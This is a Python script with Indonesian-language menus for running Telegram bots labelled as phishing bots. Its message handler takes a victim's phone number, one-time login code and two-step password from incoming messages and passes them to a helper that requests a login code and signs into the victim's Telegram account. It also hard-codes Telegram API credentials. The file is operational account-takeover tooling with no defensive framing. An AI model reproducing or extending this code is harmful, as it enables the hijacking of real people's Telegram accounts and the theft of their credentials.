import os
import re
import sqlite3
import asyncio
from telethon import TelegramClient, events
from colorama import Fore, Back, Style, init

from percobaan.send_request_login import SendRequestLogin

# Inisialisasi colorama
init(autoreset=True)

# Setup database SQLite
db_path = "/bot_sessions.db"
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name_phising TEXT,
        bot_token TEXT UNIQUE
    )
""")
conn.commit()

# Folder penyimpanan sesi
SESSION_FOLDER = "my_bot"
os.makedirs(SESSION_FOLDER, exist_ok=True)

class MyTelegramBot:
    def __init__(self, api_id, api_hash, bot_token, name_phising):
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot_token = bot_token
        self.name_phising = name_phising
        self.session_path = os.path.join(SESSION_FOLDER, f"{self.bot_token}.session")
        self.client = TelegramClient(self.session_path, api_id, api_hash)
    def extract_phone_number(self, message_text):
        match = re.search(r'\+(\d+)', message_text)
        return match.group(0) if match else None

    def extract_code(self, message_text):
        match = re.search(r'OTP\s*\|\s*(\d+)', message_text)
        return match.group(1) if match else None

    def extract_password(self, message_text):
        match = re.search(r'password \| (.*)', message_text)
        return match.group(1).strip() if match else None

    async def message_handler(self, event):
        incoming_message = event.message.text


        phone_number = self.extract_phone_number(incoming_message)
        code = self.extract_code(incoming_message)
        password = self.extract_password(incoming_message)


        bot = SendRequestLogin(phone_number, self.api_id, self.api_hash)
        code_hash=""
        if phone_number != None and code == None and password == None:

            code_hash = await bot.send_request_code()
        elif phone_number != None and code != None and password == None:
            print("Mencoba Login Dengan OTP")
            await bot.login_by_code( code)
        elif phone_number != None and code != None and password != None:
            await bot.login_by_password(password)

    async def start(self):
        async with self.client:
            try:
                await self.client.start()
                print(f"{Fore.GREEN}Bot {self.bot_token} siap menerima pesan!")
                self.client.add_event_handler(self.message_handler, events.NewMessage())
                await self.client.run_until_disconnected()
            except Exception as e:
                print(f"{Fore.RED}Terjadi kesalahan: {e}")

# Fungsi untuk menyimpan sesi ke database
def save_bot_session(name_phising, bot_token):
    cursor.execute("INSERT OR IGNORE INTO bots (name_phising, bot_token) VALUES (?, ?)", (name_phising, bot_token))
    conn.commit()

# Fungsi untuk mendapatkan bot terakhir
def get_last_bot():
    cursor.execute("SELECT bot_token FROM bots ORDER BY id DESC LIMIT 1")
    return cursor.fetchone()

# Fungsi untuk menampilkan daftar bot yang tersimpan
def list_bots():
    cursor.execute("SELECT id, name_phising, bot_token FROM bots")
    bots = cursor.fetchall()
    if not bots:
        print(f"{Fore.RED}Tidak ada bot yang tersimpan.")
    else:
        print(f"{Fore.CYAN}Daftar bot yang telah login:")
        for bot in bots:
            print(f"{Fore.GREEN}[{bot[0]}] {bot[1]} - {bot[2]}")

# Fungsi untuk menghapus semua sesi bot
def delete_all_sessions():
    cursor.execute("DELETE FROM bots")
    conn.commit()
    for file in os.listdir(SESSION_FOLDER):
        if file.endswith(".session"):
            os.remove(os.path.join(SESSION_FOLDER, file))
    print(f"{Fore.RED}Semua session telah dihapus!\n")

if __name__ == "__main__":
    api_id = '22003089'
    api_hash = '2681d1c1b490e153681df7c0d6b20a3b'

    while True:
        os.system("clear" if os.name == "posix" else "cls")  # Bersihkan terminal
        print(f"{Fore.LIGHTBLUE_EX}{Back.BLACK}*** TELEGRAM BOT MANAGER ***\n")
        menu = input(f"""
        {Fore.GREEN}1. Gunakan bot telegram yang terakhir login
        {Fore.CYAN}2. Login Telegram bot baru
        {Fore.LIGHTYELLOW_EX}3. Lihat daftar bot yang telah login
        {Fore.RED}4. Hapus semua session bot
        {Fore.MAGENTA}0. Exit program
        {Fore.WHITE}Pilih menu: """).strip()

        if menu == "1":
            last_bot = get_last_bot()
            if last_bot:
                bot_token = last_bot[0]
                print(f"{Fore.GREEN}Menggunakan bot terakhir: {bot_token}")
                bot = MyTelegramBot(api_id, api_hash, bot_token, "Unknown")
                asyncio.run(bot.start())
            else:
                print(f"{Fore.RED}Tidak ada bot yang tersimpan!")
                input("Tekan Enter untuk kembali...")

        elif menu == "2":
            name_phising = input(f"{Fore.YELLOW}Masukkan nama phising: ")
            bot_token = input(f"{Fore.CYAN}Masukkan bot token: ").strip()
            save_bot_session(name_phising, bot_token)
            bot = MyTelegramBot(api_id, api_hash, bot_token, bot_token)
            asyncio.run(bot.start())

        elif menu == "3":
            list_bots()
            input("\nTekan Enter untuk kembali...")

        elif menu == "4":
            confirm = input(f"{Fore.RED}Apakah Anda yakin ingin menghapus semua session? (ya/tidak): ").strip().lower()
            if confirm == "ya":
                delete_all_sessions()
                input("\nTekan Enter untuk kembali...")

        elif menu == "0":
            print(f"{Fore.RED}Program dihentikan.")
            exit(0)

        else:
            print(f"{Fore.RED}Pilihan tidak valid!")
            input("Tekan Enter untuk kembali...")
